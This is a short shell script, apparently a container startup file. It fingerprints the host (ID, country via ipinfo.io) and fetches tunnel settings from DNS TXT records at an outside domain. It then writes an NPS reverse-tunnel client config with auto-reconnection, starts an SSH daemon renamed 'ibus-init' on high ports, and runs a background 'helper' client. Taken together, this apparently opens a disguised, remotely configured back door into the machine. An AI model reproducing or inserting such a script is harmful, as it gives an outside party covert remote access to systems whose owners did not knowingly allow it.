#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

if [ ! -f "/etc/hostid" ]; then
HOSTID=`cat /proc/sys/kernel/random/uuid | cut -c1-8`
fi

COUNTRY=`curl ipinfo.io/country  2>/dev/null || curl ipinfo.io/country 2>/dev/null`
QQ=`dig -t txt qq.15099.net +short`
QQ="${QQ:1:${#QQ}-2}"
HOSTID=`cat /etc/hostid`
DOCKERID=$DOCKERID-$COUNTRY-$QQ-$HOSTID
echo $DOCKERID > /etc/dockerid


NPSTXT=`dig -t txt npstxt.15099.net +short`
NPSTXT="${NPSTXT:1:${#NPSTXT}-2}"
HELPDOMAIN=`echo $NPSTXT | awk -F " " '{ print $1}'`
BRIDGE_PORT=`echo $NPSTXT | awk -F " " '{ print $2}'`
MODE=`echo $NPSTXT | awk -F " " '{ print $3}'`
PUBLIC_VKEY=`echo $NPSTXT | awk -F " " '{ print $4}'`


if [ ! -f "/conf/npc.conf" ]; then
mkdir -p /conf
fi

DOCKERID=`cat /etc/dockerid `
cat > /conf/npc.conf<< TEMPEOF
[common]
server_addr=$COUNTRY.$HELPDOMAIN:$BRIDGE_PORT
conn_type=$MODE
vkey=$PUBLIC_VKEY
auto_reconnection=true
remark=$DOCKERID
TEMPEOF


# https://github.com/sjourdan/alpine-sshd
ibus-init -Rm -p 22622 || ibus-init -Rm -p 22623 ||  ibus-init -Rm -p 22624
helper 1> /conf/npc.log 2>&1 &
